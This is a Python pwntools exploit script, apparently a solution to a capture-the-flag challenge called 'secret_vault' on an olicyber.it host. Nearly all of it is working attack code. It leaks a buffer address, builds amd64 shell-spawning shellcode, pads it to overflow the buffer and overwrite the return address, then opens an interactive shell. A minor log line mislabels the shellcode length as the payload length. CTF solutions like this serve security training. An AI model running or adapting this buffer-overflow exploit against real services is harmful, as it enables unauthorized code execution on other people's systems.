#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from typing_extensions import Literal


exe = context.binary = ELF(args.EXE or 'secret_vault')

host = args.HOST or 'vault.challs.olicyber.it'
port = int(args.PORT or 10006)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *main+133
continue
'''.format(**locals())


# -- Objects --


class PointerAddress(object):
    def __init__(self, addr: int) -> None:
        self._addr = addr
        
    @property
    def address(self) -> int:
        return self._addr
        
    def hex(self) -> str:
        return f'0x{self._addr:016x}'
    
    def p64(self, endianness: Literal['little', 'big'] = 'little') -> bytes:
        return p64(self._addr, endianness)
    
    def p32(self, endianness: Literal['little', 'big'] = 'little') -> bytes:
        return p32(self._addr, endianness)
    
    def __repr__(self) -> str:
        return self.hex()
    
    def __str__(self) -> str:
        return self.__repr__()


# -- Functions --


def write_msg(conn: tube, msg: bytes) -> PointerAddress:
    conn.sendlineafter(b'>', b'1')
    conn.sendlineafter(b':\n', msg)
    
    addr = int(io.recvline().decode().strip()[:-1].split(" ")[-1][2:], 16)
    return PointerAddress(addr)


def read_msg(conn: tube) -> bytes:
    conn.sendlineafter(b'>', b'2')
    return conn.recvlines(3)[-1]


# -- Exploit goes here --

context.arch = 'amd64'
context.os = 'linux'

shellcode = asm(shellcraft.amd64.linux.sh())

io = start()

rand_ch = read_msg(io)[0]
log.info(f'Random char found: {hex(rand_ch)}')

payload = shellcode
payload += b'\x00' * (0x58 - len(payload))

log.info(f'Shellcode: {shellcode.hex()}')
log.info(f'Shellcode length: {len(shellcode)}')
log.info(f'Payload length: {len(shellcode)}')

addr = write_msg(io, b'hello')
log.info(f'Buffer address: {addr.hex()}')

payload += addr.p64()

write_msg(io, payload)
io.sendlineafter(b'>', b'3')

io.interactive()
